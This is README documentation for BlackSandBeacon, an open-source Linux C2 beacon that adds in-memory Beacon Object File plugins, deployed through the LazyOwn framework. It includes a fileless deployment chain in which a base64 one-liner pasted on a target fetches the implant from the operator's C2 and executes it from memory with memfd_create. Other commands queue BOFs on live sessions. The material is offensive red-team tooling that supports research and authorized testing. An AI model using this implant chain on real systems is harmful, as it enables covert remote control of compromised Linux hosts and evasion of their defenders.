## BlackSandBeacon — Linux BOF

**BlackSandBeacon** brings Beacon Object File (BOF) extensibility to Linux for the
first time in an open-source C2 framework. No commercial C2 (including Cobalt Strike)
offers Linux BOF support.

### What is Linux BOF?

On Windows, BOFs are position-independent PE COFF objects loaded by the beacon at
runtime, giving operators an in-memory plugin system without spawning new processes.
BlackSandBeacon ports this model to Linux:

- BOFs compile as **position-independent ELF objects** (`.x64.o`) with GCC
  (`-fPIC -nostdlib -m64`, one `make bof-<name>` target per object).
- The beacon fetches the object from the C2 (`/bof/<name>.x64.o`) and loads it with
  the native in-memory **RunELF loader** — W^X trampolines, forced stack alignment,
  no disk writes, no new process, no shell.
- The **`datap` API** (`BeaconDataParse`, `BeaconDataInt`, `BeaconDataExtract`,
  `BeaconPrintf`, `BeaconOutput`) is source-compatible with the Windows BOF contract,
  so existing BOF authors can port by replacing Win32 calls with Linux syscalls or
  libc equivalents.
- Advanced BOFs can use **direct syscalls via inline assembly** or `io_uring` for
  kernel interaction without libc linking.

### Deployment via LazyOwn (fileless)

```bash
# 1. Build and stage the beacon (git pull + make beacon)
(LazyOwn) > blacksandbeacon

# 2. Rewire the runtime config onto the LazyOwn C2 and stage the /s/ artifacts
(LazyOwn) > beacon_deploy

# 3. Paste the printed one-liner on the target: it fetches the ELF and the
#    config over HTTPS, memfd_create both and execve the beacon from memory.
echo <b64> | base64 -d | BSB_STAGE_URL='https://{lhost}:{c2_port}' python3 -

# 4. Build and stage the BOF objects (git pull + make bofs)
(LazyOwn) > blacksandbeacon_bof

# 5. Queue a bof: command on a live session (beacon downloads and runs it in memory)
(LazyOwn) > bof_run whoami <beacon_id>
```

### Porting a Windows BOF to Linux

```c
// Replace Win32 API calls with direct syscalls or libc equivalents.
// The datap API remains identical.
#include "beacon_api.h"

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *target = BeaconDataExtract(&parser, NULL);
    // Linux: use syscall(SYS_open, ...) instead of CreateFile
    BeaconPrintf(CALLBACK_OUTPUT, "target: %s\n", target);
}
```

Compile: `make bof-mybof` (gcc -c -fPIC -nostdlib -m64, output `build/bof/mybof.x64.o`)

### Adoption gap this closes

| Capability | Cobalt Strike | Sliver | Havoc | LazyOwn + BlackSandBeacon |
|---|---|---|---|---|
| Windows BOF | Yes | No | No | [Yes (via `beacon` addon)](https://github.com/grisuno/beacon) |
| Linux BOF | **No** | **No** | **No** | **Yes** |
| ARM BOF | No | No | No | [Planned (`blackzincbeacon`)](https://github.com/grisuno/blackzincbeacon) |
| Open source | No | Yes | Yes | Yes |
